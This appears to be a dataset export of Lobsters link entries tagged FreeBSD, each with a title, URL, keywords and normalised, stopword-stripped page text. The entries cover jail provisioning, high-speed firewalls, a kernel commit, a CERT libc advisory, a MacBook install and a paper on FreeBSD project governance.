494,Lobsters,freebsd,FreeBSD,BSDploy – FreeBSD jail provisioning,http://bsdploy.readthedocs.io/en/latest/,bsdploy freebsd jail provisioning,bsdploy freebsd jail provisioning provision configure maintain freebsd jail host jail main feature provision describe declarative configuration ansible imperative maintenance fabric zfs pool filesystems wholediskencryption modular provisioning virtualbox amazon work example session best world hood ezjail ployground family tutorial setup general usage contribute license todo,bsdploy freebsd jail provisioning bsdploy comprehensive tool remotely provision configure maintain freebsd jail host jail main design goal lower barrier repeatable jail setup instead performing update production host encouraged update description setup test identically configured staging scenario work expected apply updated configuration production confidence main feature provision complete jail host scratch describe one jail host jail canonical configuration declarative configuration apply ansible playbook host jail imperative maintenance run fabric script host jail configure zfs pool filesystems wholediskencryption modular provisioning plugins virtualbox amazon architecture support work bsdploy take shape commandline tool name ploy installed socalled control host typically laptop desktop machine control one target host two thing installed target host bsdploy python ezjail everything else stay control host example session abbreviated bootstrapping session simple website inside jail amazon instance could look like ploy start ecinstance ploy configure jailhost ploy start webserver ploy configure webserver ploy webserver uploadwebsite best world combining declarative approach setting initial state system imperative approach providing maintenance operation state significant advantage since imperative script luxury running welldefined context keep short concise without worrying edge case since playbook concern performing update task litter awkward state restarted updated even worse nonstates shell command hood bsdploy scope quite ambitious naturally attempt work fact bsdploy fairly thin slightly opinionated wrapper around existing excellent tool addition mentioned ansible fabric us ezjail host manage jail client numerous member ployground family pretty much everything else tutorial indepth tutorial quickstart setup setup host scratch make existing one ready bsdploy general usage create manage jail host set contribute code issue hosted github license project licensed beerware license todo following feature already exist still need documented provisioning bootstrapping daemonology based preconfigured ssh server key jail access port forwarding public ip zfs management creating restoring zfs snapshot poudriere support upgrading strategy vagrant mode use virtualized jail development environment following feature exist yet eventually o installers support vmware explicitly like virtualbox
495,Lobsters,freebsd,FreeBSD,My BSD sucks less than yours (FOSDEM 2017),https://fosdem.org/2017/schedule/event/my_bsd_sucks_less/,bsd suck le fosdem,bsd suck le speaker link,bsd suck le instead speaking successful part project talk focus weakness openbsd freebsd exploring conceptual difference also exploring direction motivated contributor start working improve project general purpose operating system see one size nt fit one may better solution particular problem troll left door video tag supported download video speaker link
497,Lobsters,freebsd,FreeBSD,NASA@SC16: Building Cost-Effective 100-Gbps Firewalls for HPC,https://www.nas.nasa.gov/SC16/demos/demo9.html,nasa building costeffective firewall hpc,overview project detail result impact hpc matter next jordanacaraballovega nasagov johnejasen nasagov,supercomputing overview continuous growth nasa center climate simulation nccs requires providing highperformance security tool enhancing network capacity order support requirement emerging service including advanced data analytics platform adapt private cloud nccs security team proposed architecture provide extremely costeffective gbps firewall project detail aim project create commoditybased platform process enough packet per second pps sustain workload within nccs computational environment test domain consists several existing system within nccs including switch dell router dell server dell host card adapter mellanox intel x ethernet card previous nccs work testing freebsd operating system highperformance routing reached maximum million pps building work comparing freebsdcurrent along implementing netmapfwd application programming interface api tuning ethernet card used tool nuttcp netperf monitor performance maximum bandwidth card additional testing involved enabling common address redundancy protocol carp achieve activeactive architecture result impact testing shown pps rise newer version operating system deployed established pps baseline using discovered several interesting feature packetfiltering environment freebsd able send pps client centos choice network card significant impact pps tuning netmap support netmapfwd increased pps rate significantly test shown optimally tuned configured freebsd system possible create system manage huge amount pps needed create firewall commodity component hpc matter demand compute data resource increase highperformance computing hpc environment like nccs always require higherspeed security tool network ability deploy security service eg firewall without affecting performance open possibility deploying capable system science without compromising security development deployment tool enable scientist efficiently securely push research without overcome potentially huge obstacle lack highspeed packet filtering next test continue verifying result even capable systemssuch ethernet cardsto achieve even higher performance addition hardware improvement update network capability freebsdcurrent version closely monitored applied appropriate final result reference architecture representative hardware software enable nccs build deploy efficiently maintain extremely costeffective firewall jordan caraballovega nasa goddard space flight center jordanacaraballovega nasagov john e jasen nasa goddard space flight center johnejasen nasagov
498,Lobsters,freebsd,FreeBSD,The Trouble with FreeBSD,https://www.youtube.com/watch?v=Ib7tFvw34DM,trouble freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature trouble freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature trouble freebsd youtube
499,Lobsters,freebsd,FreeBSD,Improving TrueOS: OpenRC,https://www.trueos.org/blog/improving-trueos-openrc/,improving trueos openrc,open letter trueos community trueos discontinuation truenas core,open letter trueos community trueos discontinuation hey trueos community wanted take minute address may already guessed heavy heart trueos core team decided discontinue development trueos foreseeable future still heavily involved open source project like freenas truenas core incredibly proud work put trueos predecessor pcbsd trueos source code remain available github others may want continue work started many year ago explain much appreciate loyal fan trueos pcbsd past confident even though hard decision also correct decision exciting new project becoming involved like truenas core question hesitate ask many thanks best wish joshua kris
501,Lobsters,freebsd,FreeBSD,[net80211] Add initial VHT support routines.,https://lists.freebsd.org/pipermail/svn-src-head/2017-January/095565.html,add initial vht support routine,svn commit adrian freebsdorg http adrian freebsdorg adrian freebsdorg information svnsrchead mailing list,svn commit adrian chadd adrian freebsdorg sun jan utc author adrian date sun jan new revision url http log add initial vht support routine skeleton set based implement ie parsing basic unfinished negotiation channel promotiondemotion however enough vht notably actual channel promotion sta mode least done part htinfoupdatechw quite amused found checking others see progress rather one huge commit vht done likely quite added content prop changed content prop changed added devnull empty file newly added sun jan copyright c adrian chadd adrian freebsdorg right reserved redistribution use source binary form without modification permitted provided following condition met redistribution source code must retain copyright notice list condition following disclaimer redistribution binary form must reproduce copyright notice list condition following disclaimer documentation andor material provided distribution software provided author express implied warranty including limited implied warranty merchantability fitness particular purpose disclaimed event shall author liable direct indirect incidental special exemplary consequential damage including limited procurement substitute good service loss use data profit business interruption however caused theory liability whether contract strict liability tort including negligence otherwise arising way use software even advised possibility damage include syscdefsh ifdef freebsd fbsdid freebsd endif ieee protocol support include optineth include optwlanh include sysparamh include syskernelh include sysmalloch include syssystmh include sysendianh include syssocketh include netifh include netifvarh include netifmediah include netetherneth include include include include define used throughout file define m v f v f f define sm v f v f f define addshort frm v frm v frm v frm define addword frm v frm v frm v frm v frm v frm xxx todo handle wlanactionvhtopmodenotif look detail static void void sysinit wlanvht sisubdrivers siorderfirst null void struct ic void struct ic void struct vap struct ic vap ivic ic return vap ivvhtcaps ic icvhtcaps vap ivvhtextcaps ic icvhtextcaps xxx assume support really check vhtcaps vap ivflagsvht xxx todo enable capability memcpy vap ivvhtmcsinfo ic icvhtmcsinfo sizeof struct void struct vap static void vhtannounce struct ic enum mode endif static int vhtmcstonum int switch case return case return case return default return void struct ic int tx rx ic return channel width icprintf ic vht channel width ic icvhtcaps printf ic icvhtcaps printf printf n feature icprintf ic vht feature bn ic icvhtcaps vht worry vht later stream bit tx ic icvhtmcsinfotxmcsmap rx ic icvhtmcsinforxmcsmap tx rx continue icprintf ic vht n tx mc rx mc dn vhtmcstonum tx vhtmcstonum rx void struct ni ni nivap ni called func ni niflags void struct ni ni nivap ni called func ni niflags ni nivhtcap bzero ni nivhtmcsinfo sizeof struct parse vht operation ie void struct ni const ie vht operation ni nivhtchanwidth ie ni ie ni ie ni nivhtbasicmcs ie printf chanwidth func ni ni ni nivhtchanwidth ni nivhtbasicmcs endif parse vht capability ie void struct ni const ie vht capability ni nivhtcap ie suppmcs ni nivhtmcsinforxmcsmap ie ni nivhtmcsinforxhighest ie ni nivhtmcsinfotxmcsmap ie ni nivhtmcsinfotxhighest ie int struct ni const vhtcapie const vhtopie printf calledn func ni vhtcapie ni vhtopie return void struct ni const vhtcapie const vhtopie printf calledn func xxx todo void struct ic void struct ni ni nivap ni called func void struct ni ni nivap ni called func frm struct ni cap memset frm sizeof struct frm frm sizeof struct frm nt configuration populate node configuration worry making configurable later cap ni nivhtcap xxx todo capability change required configuration vht capability addword frm cap suppmcs addshort frm ni nivhtmcsinforxmcsmap addshort frm ni nivhtmcsinforxhighest addshort frm ni nivhtmcsinfotxmcsmap addshort frm ni nivhtmcsinfotxhighest return frm static struct c xxx todo look node configuration well c return c return c return c return c return nt get printf called nonvht channel freq func int c icfreq c icflags return note us current channel information nt use node info parsing frm struct ni memset frm sizeof struct frm frm sizeof struct frm xxx station see node channel anyc anyc assume scanning announce capability set wide config wide config done vhtcap mode limit channel chanwidth frm ni nichan frm ni nichan frm ni nichan basic mc set addshort frm return frm void struct ni const vhtcapie const vhtopie ni vhtcapie ni vhtopie static struct findvhtchan struct ic struct c int vhtflags return ic c icfreq c icflags vhtflags handle channel promotion vht similar struct struct ic struct chan int flag struct c first case handle channel demotion vht nt set flag printf demoting channel func chan icieee chan icflags endif c ic chan icfreq chan icflags c null c chan printf func c icieee c icflags endif return c upgrade vht attempt note nt clear ht flag hint selecting larger channel start c null c null flag c findvhtchan ic chan c null flag c findvhtchan ic chan c null flag c findvhtchan ic chan c null flag c findvhtchan ic chan c null flag c findvhtchan ic chan get always possible checked c null c findvhtchan ic chan c null chan c printf selected func c icieee c icflags endif return chan added devnull empty file newly added sun jan copyright c adrian chadd adrian freebsdorg right reserved redistribution use source binary form without modification permitted provided following condition met redistribution source code must retain copyright notice list condition following disclaimer redistribution binary form must reproduce copyright notice list condition following disclaimer documentation andor material provided distribution software provided author express implied warranty including limited implied warranty merchantability fitness particular purpose disclaimed event shall author liable direct indirect incidental special exemplary consequential damage including limited procurement substitute good service loss use data profit business interruption however caused theory liability whether contract strict liability tort including negligence otherwise arising way use software even advised possibility damage freebsd ifndef define void struct void struct void struct void struct void struct void struct void struct void struct const void struct const int struct const const void struct const const void struct ic void struct ni void struct ni frm struct frm struct void struct const const struct struct struct int endif information svnsrchead mailing list
502,Lobsters,freebsd,FreeBSD,From Micro-Services to Monoliths,https://iwantmyname.com/blog/from-micro-services-to-monoliths,microservices monolith,apache couchdb catalyst rabbitmq apache couchdb kyoto tycoon docker linux container freebsd freebsd zfs jail port zfs boot environment jail port pair server carp haproxy haproxy haproxy nginx zfs elixir phoenix erlangotp apache couchdb rabbitmq search catalyst elixir phoenix shot worldwide notice live debugging boot environment erlang tracing erlang dtrace recon dtrace freebsd rabbitmq couchdb kyoto tycoon looking ahead iwantmyname,last month replatformed twice hopefully without noticing first major shift cost advantage changing host provider second moving latest debian release brought flurry patch change wanted feeling beholden o patch rather customer business systemd introduced cascade change requiring change service run change continue roll time migrating hosting provider enabled u move core database server running apache couchdb much larger faster machine using ssd much ram building index faster allows u deploy code faster well fact possible cache entire database index ram helped responsiveness whole site always fairly microserviceslike architecture stood test time frontend application written perl using catalyst framework communicates worker variety programming language using rabbitmq message broker service run several different server two main database apache couchdb kyoto tycoon builtin replication provides applicationlevel redundancy well simplifying operation backup upgrade despite microservices introduced small delay every step network latency due round trip reliance stable internet connection extra conversion json native programming language used service endtoend testing application also complicated something needed change twitter scale need feature set amazon google cloud also mindful avoiding cloud lockin profitability business change much halve double infrastructure use asked way best world decoupling microservices without latency debugging simplicity monolith without interruption continual upgrade could operational flexibility cluster without risk catastrophic meltdown could test environment ran laptop still matched production probably number mumbling docker breath getting sweaty palm thinking linux container tried answer spent time trying get tightly coupled container stack working together actually shipping code production improving stability reliability service key failure container vision today unless google scale significant cost advantage reduced server footprint afford fleet container infrastructure engineer keep evolving landscape operational effort simply stack deliver benefit necessary rewrite logging monitoring packaging deployment dedicate engineer maintaining grooming container monster simplify shipping code production needed plain oldfashioned boring infrastructure loosely coupled layer without introducing latency still allowing flexibility containerthink movement something long support lifespan needed compromise ability keep front foot patch security o apps came end settled three core change move o debian linux freebsd switch distributed containerstyle vm microservices paired physical server migrate perlbased catalyst core app elixir phoenix many know already glimpse thinking freebsd freebsd one original free unixlike operating system going stronger ever power netflix mighty streaming server used modified form sony playstations apple io osx internet provider use freebsd form freebsd also long support lifespan core o time allowing u use latest port package neat mix backward compatibility honest freebsd already legup couple u using three big advantage freebsd u zfs jail port zfs arguably leading filesystem time great flexibility power including inbuilt highspeed compression data checksum bitrot silent data corruption snapshot replication backup also support boot environment clever snapshotbased way managing upgrade safely make testing ultimately deploying new version freebsd apps service deployed upon largely riskfree simple freebsd jail decade old similar linux container conceptually however venturebacked company fighting turf hope achieving vmwarelike monopoly software well integrated operating system community tooling performance jailed application effectively running main kernel network filesystem standpoint port tree significant feature bsdderived operating system share massive repository subversion git please every piece opensource software could possibly imagine core business providing simplified domain purchase management custom software often position needing specific version tool application needing custom patch deployed immediately wait upstream application owner merge patch trickle o distribution package manager port tree custom private repo package ability carry patch hold back specific version need simple straightforward fashion needed new package get change committed proved extremely simple make maintaining infrastructure simple indeed installing handful package get u running much faster past fourth advantage u however freebsd community closeknit reasonably consistent culture thing right practice mean little gap issue identify knowledge missing developer community creating documentation freebsd part culture thing right integration o tool ship result already looking forward contributing community overall result moving freebsd hope spend significantly le effort managing infrastructure time invested improving service business pair server freebsd jail allow u run microservices single box arguably different linux container practice however fighting accommodate stream change add value business along way forced change operation tool process value customer latest container tech running simple reliable service infrequent time need acquire manage domain throughout year region deploying pair physical server one providing service application within pair using dns round robin name resolution carp lowlevel ip availability solution built freebsd provide load balancing failover network level box next layer paired server stack awesome haproxy load balancer use ensure direct user closest best performing application server haproxy also allows u dynamically remove add backend service pool whether deployment maintenance communicates across cluster maintain transparent view service customer consolidation brings disparate virtual machine back onto server whilst still using freebsd jail maintain microserviceslike separation luckily none apps required major change make run freebsd unix standardisation huge benefit complete significantly reduced app latency removing network roundtrips today key difference dockerstyle container architecture little coordination dependency layer carp fundamentally network protocol could easily disable issue choose facility haproxy could replaced nginx already use today slightly different functionality zfs provides incredible filesystem available within jail core operating system solid reliable platform service data logging monitoring upgrade done using decoupled tool using wellknown unix standard place decade nothing wrong preserving simplicity suit u elixir phoenix since almost beginning iwantmyname programming language erlangotp heart thing programming language apache couchdb developed well rabbitmq message broker core search application also written erlang robustness shown time time transparently deal issue transient connection failure api partner generally required significantly le maintenance effort service concurrent functional language softreal time characteristic ideally suited building website service make heavy use asynchronous internal external apis frontend app written perl catalyst framework leading edge first started using become hindrance evolving robust mobile first system perl forking worker model mean use significant amount ram across infrastructure ensure handle definitely web scale user network load experiencing several year solid erlang reliability picked elixir new functional programming language run erlang vm phoenix web framework written language upgrade eventually replace front end application erlang beam virtual machine provides elixir phoenix screamingly fast robust reliable concurrent web framework without memory overhead forking model able handle many concurrent connection transparently erlang freebsd used heavily whatsapp shot worldwide notice facebook acquired lowstaffed app live debugging sometimes stuff break production apparent reason need know hurry recent month traced debugged transient internet outage upstream api change timeouts failure unanticipated thirdparty library concurrency model change much much much pain frustration debugging current infrastructure painful process usually involving reading log file using lowlevel linux tool like strace inserting print statement redeploying furiously trying understand underlying issue resulting flood information aside able roll back safely change using boot environment package new stack provides incredible introspective live debugging capability make easier u deal problem realtime without downtime importantly without needing change compiler setting edit production code fly advantage alone would reason enough move erlang vm provides native erlang tracing library community extended erlang dtrace support delightful recon freebsd support natively dtrace powerhouse introspection tool first developed sun solaris since ported several platform dubbed setup freck stack freebsd rabbitmq couchdb kyoto tycoon yes closely related abbreviation mind managed control childish mirth looking ahead end day iwantmyname domain registrar come domain plain old boring infrastructure exactly want frecks stable secure ever allowing u truly focus brain muscle overdue ui ux upgrade change iwantmyname platform coming behind scene hopefully smooth sailing front touch wood
503,Lobsters,freebsd,FreeBSD,Vulnerability Note VU#548487 - BSD libc contains a buffer overflow vulnerability,https://www.kb.cert.org/vuls/id/548487,vulnerability note vu bsd libc contains buffer overflow vulnerability,,bsd libc library linkntoa function may vulnerable classic buffer overflow currently unclear issue exploitable
504,Lobsters,freebsd,FreeBSD,clang/llvm 3.9.0 land in FreeBSD HEAD,https://svnweb.freebsd.org/base?view=revision&revision=309124,clangllvm land freebsd head,http http http,log message upgrade copy clang llvm lldb compilerrt libc release add lld also completely revamp build system clang llvm lldb related tool please note onwards clang llvm lldb require support build see updating information release note llvm clang lld available http http http thanks ed maste bryan drewery andrew turner antoine brodin jan beich help relnotes yes mfc month
505,Lobsters,freebsd,FreeBSD,FreeBSD on a MacBook Pro,https://gist.github.com/mpasternacki/974e29d1e3865e940c53,freebsd macbook pro,freebsd macbook pro jetpack terminology material macbook pro late act preparing dual boot luckily somebody already figured one http refind act ii installation described wiki,freebsd macbook pro since work apple hardware o back grew tired linux desktop going massive next year least since switched something work six year later le le work started turning spyware nagware nt need much le maintenance linux desktop least work system administration software development probably better mythical end user person work needed get software need running le obscure work need linux othe unixlike system finding turning away gui program used appreciate time use osx run terminal firefox emacs gui used nice unintrusive got annoying either came full circle last year computer usage osx experience degraded last year sysadmindeveloper kind power user perspective power user whose definition fun includes spending hour middle night figuring get dual boot working uefi next reason working lot freebsd software jetpack visible want try custom kernel option vimage racct using custom kernel seems tricky vmwarevirtualbox vm skipping vm overhead would nice final push saw terminology demo ran old laptop already got freebsd installed found working advertised xxist century graphical terminal realized display picture want want integrated mutt irssi switching yet ongoing experiment see much get running challenge take hardware developed osx particular without much thought given operating system designed make interoperability easy get open o running see much tradeoff want try running open operating system safely expect software wo nt insist phoning home syncing data cloud wo nt nag enable feature require choose skip also practical side hardware nt plan get new workstation soon surely miss thing first start xorg already cringe font rendering maybe configurable somewhere though libreoffice good replacement m officeiwork probably nt match keynote sure document viewer nowadays apple preview nice invisible omnigraffle flux time machine integrated address book ibooks dash handy documentation browser paper couple game probably hard time figuring use closed software need work fan flash player skype google still list nt seem big long apple hardware keep dual boot wo nt hurt try worst case learn something new go back osx material asked hardware exactly macbook pro late ram optical drive exchanged second hard drive attached apple thunderbolt display another reason get new hardware wireless bluetooth apple keyboard touchpad hope get working least basic level installing freebsd snapshot newer one already got mine already installed even managed update buildworldinstallworld act preparing dual boot first need disk space already trickier expected delete stuff make space also timeconsuming plan use main hard disk freebsd leave rest osx deleting moving enough junk bumped first obstacle resizing system volume osx nt smart enough resize running partition something entirely unexpected also smart enough provide meaningful error message push progress bar hour two fail could nt unmount disk message thing booted rescue mode loaded hidden partition disk located right main osx system partition macintosh hd shrink recovery partition relocated luckily somebody already figured one made installer sd card installer still disk since osx upgrade described http started disk utility installer able successfully shrink partition need boot manager seems refind way go first booted sd card see start installed disk finding get configuration needed later obvious though need start disk utility select efi partition system disk mount boot manager mounted volumesefi act ii installation downloaded installer image read probably already recent one dded sd card booted refind booting card mbr legacy boot nt work rescanned pressing esc boot menu selected rescue partition card apparently meant card efi partition installer managed boot installer boot fine important thing loader get moment ca nt read zfs yet boot need ufs partition found seems work zfsenabled underway get tried achieve old linux way boot separate partition mounted zfs root could nt get work kernel booted nt able mount root directory end used following scheme ufs partition end disk system root big enough hold base system couple kernel plus margin large zfs partition root dir mounted tank wanted zfs partition located ufs root able shrink osx partition movegrow zfs later bunch symlinks nt let installer touch zfs partition create boot partition tried add end installation selected open shell new system button nt remember exact label created zpool mounted tank created usr var filesystems described wiki plus usrdoc copied whole existing home var subdirectory usr replaced main filesystem home var usr doc port src obj local symlinks tank filesystems way system partition wo nt grow much get zfs benefit able boot system efi also added zfsenable yes new system etcrcconf booting new system manually zfs import zpool everything worked fine finishing installation copy installer new system file someplace safe going need finishing installation wo nt see bsd refind boot menu problem boot osx mount volumesefi disk utility create volumesefiefifreebsd directory put file trick unmount efi volume reboot see freebsd boot menu boot fine probably need run zfs import tank first boot besides everything work fine base system installing package pkg work x window kind work still quite far comfortable optimal setup working right also need disk volume data want share osx freebsd trying decide exfat zfs openzfs osx mac side post find one work fine
506,Lobsters,freebsd,FreeBSD,"Devin Teske - Jail Networking, MeetBSD 2016",https://www.youtube.com/watch?v=aoW7pWuhT_A,devin teske jail networking meetbsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature devin teske jail networking meetbsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature devin teske jail networking meetbsd youtube
507,Lobsters,freebsd,FreeBSD,Authority in peer production: The emergence of governance in the FreeBSD project,http://peerproduction.net/issues/issue-1/peer-reviewed-papers/authority-in-peer-production/,authority peer production emergence governance freebsd project,democratic governance phase date table rule suspension commit right source freebsd lehey imperative autonomy authority legitimacy acknowledgement note work cited,research interest computer software produced distributed freely internet voluntary association hacker known free open source software fo project constantly increasing last ten year breaking many established assumption software developed fo project captivated attention organisation theorist volunteer character participation fo project administrator must resort governance mechanism available firm pay developer work von krogh von hippel p environment authority persuasive legal technical certainly determinative benkler p yet mean authority exists social system operate continuous basis without support mode authority harrison p view fact fo project coercive apparatus mobilise development resource impose compliance rule norm authority articulated development early study hacker culture stressed hacker disdain bureaucratic organisation opposition centralised authority pointing activity encapsulate definite morality known hacker ethic exalts joy autonomy inherent intrinsicallymotivated activity well free sharing knowledge lay heart hacker community levy interestingly spite passage time character hacker morality changed recent study eg hinanen weber shown academic discourse emerged recently centred organisational characteristic fo project benkler coined term commonsbased peer production underline one hand centrality common property regime enabling fo project informal collegial character participation according weber pp governance consists combination leadership practice cultural norm define legitimate right redistribute modified version software make decision contribution included public distribution type governance demil lecocq call bazaar governance represents institutional framework work organisation differs fundamentally coordination effected hierarchy market network largely account low level social control environment demil lecocq p markus pointed aim governance fo project incentivise participation b facilitate task coordination development process de laat called attention evolutionary character fo governance work coordination small project achieved informally mutual adjustment participant larger project due coordination cost attendant upon expansion scale require elaborate mean coordination thus contrast spontaneous organisation characteristic small project large project without measure systematisation rule work procedure space last ten year significant number work explored governance large fo project shah study showed heavyhanded control deters participation p governance structure affect decisively number developer attracted project developer project investigated remarked choose task set schedule underlining role freedom creativity spurring participate p according mateosgarcia steinmueller p study debian source authority fo project knowledge purpose technique acquired demonstrated participation prolific developer rewarded reputation sustained contribution thereby permitting exercise authority project participant least contribution mateosgarcia steinmueller p see also de laat p mahony ferraro study debian looked transformation governance system catalysed conflict project leader community maintainer perceived lack legitimacy authority resulting reform combined element democratic bureaucratic control p prevent autocratic rule nourish conception leadership based consensusbuilding addition establishing check upon leader authority debian devised new recruitment process ensure new recruit posse right skill also view consistent sociopolitical goal project also see mateosgarcia steinmueller p wavelength neil chapter introduced term tribal bureaucracy denote one hand debian rejection market favour cooperative production resolve demarcate authority project leader limited form bureaucracy fo study mateosgarcia steinmueller mahony ferraro shah demonstrate clearly penetrating insight longitudinal study permit covering timespan project grown considerably relationship scale mode governance examined rigorous manner dealing longitudinal data course implies case study research design research strategy commonly used understand dynamic within single setting eisenhardt p thus inquiry adopts case study research design centred freebsd project chosen scale increased dramatically time b informal nonhierarchical character development process underlined prior work eg holck source secondary data draw include prior organisation study freebsd past survey freebsd developer published literature document related development freebsd released project published developer primary data source consist activity log collected freebsd publiclyaccessible software repository analysed ass number active developer time observation projectrelated activity manifest mailing list used freebsd developer environment noted authority coercive person authority deprived mean impose upon project member able exercise influence management project authority must perceived legitimate question authority legitimised fo project therefore crucial purpose analysing type authority emerges collaborative enterprise manned volunteer draw upon max weber classical analytical framework although hundred year elapsed since original publication emphasis lay upon base legitimisation authority central organisational feature capacity analyse informal volunteer organisation make ideally suited task hand approach also facilitates comparison finding researcher figure prominently literature study looking authority articulated fo project often use analytical framework concept category weber pioneered study authority group eg himanen mahony ferraro neil freebsd freeopen source operating system descended berkeley software distribution bsd version unix developed university california berkeley first version freebsd released december since freebsd established popular bsddescendant proven track record missioncritical deployment thriving contribution community software developer spread world though development effort heavily concentrated north america europe spinellis freebsd development take place thirtyfour country six continent watson organisational structure freebsd inherited bsd often credited codifying template known open source development model leonard structure core team centre small group programmer control access codebase vested authority grant revoke right integrate change project code repository spreading committers right check change framed wider community outside contributor outside contributor advance rank committers nomination existing committer approved core team alone authority grant commit privilege committers focus either three main area development freebsd src kernel userland port documentation indicatively breakdown committers made commits reveals following specialisation src committers port committers documentation committers saers see also watson age varies year mean age median age standard deviation year watson although freebsd volunteer organisation committers receive remuneration contribution many professional working industry therefore surprising working freebsd part professional work survey seventytwo freebsd committers constituting thirtyfive percent committers conducted twentyone percent said work latest contribution fully paid another twentytwo percent partially paid p warner losh sitting member core team one opinion getting paid work freebsd uncommon say current employer example allows certain amount time month work freebsd bug impact ability deploy system get fed back base freebsd time time many people similar situation losh interviewed loliqueru freebsd committers however importance economic incentive overemphasised former core team member greg lehey say lot people motivated money work freebsd hobby passion find itch scratch using freebsd freebsd benefit lehey interviewed loliqueru like large fo project freebsd parallel development structure two simultaneous development process underway crystallised two different branch software stable branch represents official released version aimed stable bugfree product current branch aka head trunk hand experimental cuttingedge development significant change eg new feature first tried fig illustrates development model based process change integrated project repository prior committing change code repository committers expected ask community review freebsd practice usually generates relatively modest amount feedback based either revisit code proceed testing system trial build next commit change current branch development release built made available download every hour release tested debugged concurrently many user developer download software resulting therefore significant improvement sufficiently tested deemed mature enough code merged committer stable branch production release made every four month process despite incremental character recursive stage might require committer return code change thereby reinitiating process naturally developer work mostly individually model used concurrently multiple developer holck saers see also jorgensen stokely watson freebsd evolved first seven year without formal mean representing contributor project governance informal governance phase following tradition established bsd hacked became part lehey core team thirteen member tree founder project jordan hubbard nate williams rod grime active thencommitters hubbard served also project president position originally give isvs corporate contact officialsounding person talk resigned position also abolished claiming created illusion core false expectation authority hubbard growth continuous throughout period three concurrent phenomenon growth peripheral contributor without commit right increase src committers person growth codebase attest dramatic expansion scale underway period however accompanied criticism project governance many committers felt composition core team longer reflected merit member prone abusing power dissent could longer channelled manageable form mediation core team prominent committer entered confrontation core team member accusing trampling change situation spiralled control threatening tear project apart discussion ensued project mailing list hubbard outlined number possible reform including dismantling core team called vote proposal well received base committers elected vote adopt elected core team model based bylaw drafted regulate election freebsd lehey approved vote active committers passed yes vote vote lehey august bylaw established criterion eligibility active committers size core team nine member periodicity election fixed every two year condition early election held petition active committers size core fall b core team member committer expelled project vote core c bylaw modified freebsd first core team formed way consisted five former core member satoshi asami david greenman jordan hubbard doug rabson peter wemm plus four new one greg lehey warner losh mike smith robert watson institutional evolution freebsd reflected series document project released view imparting structure largely informal development process first version committer guide freebsd laid guideline regulating committers conduct published amidst climate rising discontent project governance first version freebsd developer handbook followed august month first core team election information geared new committers circumnavigating freebsd development model sum conflict distribution authority concern perceived illegitimacy exercise core team led adoption elected core team model institutional restructuring along bylaw drafted regulate election created democratic basis legitimacy authority core team closely related reform attempt elaborately define scope development activity crystallised release first version committer guide elucidated process change integrated repository outlined committers behavioural code democratic governance phase date first core team election vote september ushered next phase institutional evolution project democratic governance election held core team left six member following resignation satoshi asami jordan hubbard mike smith new core team five new member john baldwin jun kuriyama mark murray wes peter murray stokely four previous one greg lehey warner losh robert watson peter wemm nine member one peter wemm part original core team election held four time since last one resulted following core team john baldwin konstantin belousov warner losh pav lucistnik colin percival wilko bulte brook davis hiroki sato robert watson transition selfselected group veteran committers elected one reinforced already extant tendency toward systematisation rule development procedure indicative ongoing formalisation rule procedure increasingly written shown continuous update freebsd handbook committer guide developer handbook interesting purpose analysis process closely connected exigency conflict management example illustrates better conflict february erupted change made committer smp code without permission john baldwin smp active thendeveloper core team intervened immediately asking remove change repository threat revoking commit privilege complied asked core team resolve issue core team month discussion consultation committers project mailing list decided delegate authority baldwin approve reject change smp module saw fit used experience formulate rule suspending commit right thereby creating standard discipline procedure set offence penalty committing code freeze result suspension commit bit two day committing security branch without approval result suspension commit privilege day commit war result party commit bit suspended day impolite inappropriate behaviour result suspension commit bit day single member core appropriate team implement suspension without need formal vote core reserve right impose harsher penalty repeat offender including longer suspension term permanent removal commit privilege penalty subject majority vote core case suspension published developer mailing list table rule suspension commit right source freebsd lehey however order decision core team received legitimate must consistent consensus opinion committers characteristically june core team received another complaint committer committed change area codebase without approval committer responsible core team decided suspend commit privilege five day accordance disciplinary rule public reaction unfavourable decision censured politicallymotivated core election underway suspended committer candidate circumstance core team forced reprieve suspension two day lehey transition elected core team model though appeased concern illegitimacy distribution authority project eradicate conflict case point conflict core team matt dillon prolific committer led revocation latter commit right according explanation given two member thencore team decision dictated social rather technological consideration dillon repeatedly violated freebsd code conduct behaviour clashed collective way thing slashdot month later dillon announced decision fork freebsd make copy codebase start independent development thus creating alternative project called dragonfly bsd dillon dillon part claimed launch new project strained relation freebsd committers due reason difference opinion regarding technical direction freebsd biancuzzi although dillon ostracism illustrates clearly conflict amenable resolution also suggests freedom fork project fo license ensure mitigates potential conflict organisation theorist know well easy access exit option dampens emergence conflict potential conflict group drastically reduced member easily walk disengaging hirschman forking nothing extreme example exit option way dispute direction technical change project admit resolution effectively translated alternative development line see freebsd core team interview loligueru period marked rapid growth massive expansion scale illustrated increase src committers total number committers increased freebsd although expansion scale brought significant increase coordination cost increased need coordination within group lead introduction direct supervision meaning internal hierarchy contribution processed upstream gatekeeper rather prompted change direction increased standardisation namely standardisation committers induction process output frequent building holck standard argument organisation theory work coordination small group may well informal based mutual adjustment group member however group get larger becomes le able coordinate informally thus control work pass single individual direct supervision becomes chief mean coordination mintzberg p freebsd spite increase committers made attempt supervise work process rather opted standardise skill standardising process outside contributor inducted project process follows committer proposes core team grant commit right outside contributor based latter history contribution usually committer vouches new member becomes mentor assuming responsibility everything project mentor sense supervisor responsible reviewing approving change prior committed repository mentorship period specific duration end mentor release officially new committer time new committer supposed developed strong grasp project goal mastered requisite technical interpersonal skill freebsd lucas easily seen standardisation recruitment process designed harmonise coexistence fiercely independent individual within committers group reducing scope conflict related integration change watson achieves building committerstobe work program base coordination thus job appear acting autonomously surgeon anaesthesiologist need hardly communicate meet operating room knowing training exactly expect virtue cultivating homogeneity value recruitment process ensures conduct new committers compatible collective way thing reduce need active coordination freebsd also resorted standardising output frequent building holck software build refers process converting humanreadable source code executable code run computer successful build therefore implies working version software built evolving codebase addition testing whether evolving product kept working state software company frequent build facilitate team coordination key idea one large team work like many small team developer synchronize work frequent periodic product cusumano selby p fo project exception krill freebsd us three socalled tinderbox server automatically build recent version software every hour result posted world wide web project mailing list notifying committers tinderbox failure focal project use mailing list committers see effect recent change pinpoint change responsible breaking build broken build result halting development bug causing breakdown found fixed key rule committers make change cause build fail freebsd rule specifying criterion performance work committers required meet achieves standardisation result work compliance rule reduces need active coordination among committers output standardized coordination among task predetermined book bindery know page receives one place fit perfectly cover 